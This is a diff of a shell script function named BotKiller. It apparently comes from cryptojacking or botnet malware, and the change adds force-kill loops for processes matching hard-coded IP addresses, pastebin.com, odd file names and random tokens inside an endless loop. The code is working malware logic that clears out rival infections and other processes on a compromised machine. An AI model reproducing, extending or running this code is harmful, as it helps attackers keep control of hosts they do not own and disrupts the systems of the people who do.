@@ -89,7 +89,7 @@ BotKiller() {
     ps aux | grep -v grep | grep '51.38.191.178'| awk '{print $2}' | xargs kill -9
     ps aux | grep -v grep | grep '51.15.56.161'| awk '{print $2}' | xargs kill -9
     ps aux | grep -v grep | grep '86s.jpg'| awk '{print $2}' | xargs kill -9
-    #ps aux | grep -v grep | grep 'pastebin.com'| awk '{print $2}' | xargs kill -9
+    ps aux | grep -v grep | grep 'pastebin.com'| awk '{print $2}' | xargs kill -9
     ps aux | grep -v grep | grep 'aGTSGJJp'| awk '{print $2}' | xargs kill -9
     ps aux | grep -v grep | grep 'nMrfmnRa'| awk '{print $2}' | xargs kill -9
     ps aux | grep -v grep | grep 'PuNY5tm2'| awk '{print $2}' | xargs kill -9
@@ -579,7 +579,9 @@ BotKiller() {
         kill -9 $pid;
     done
 
-    ps aux | grep ‘dblaunch’ | awk ‘{print $2}’
+    for pid in $(ps aux | grep "dblaunch" | awk "{print $2}"); do
+        kill -9 $pid;
+    done
 };
 
 while true; do
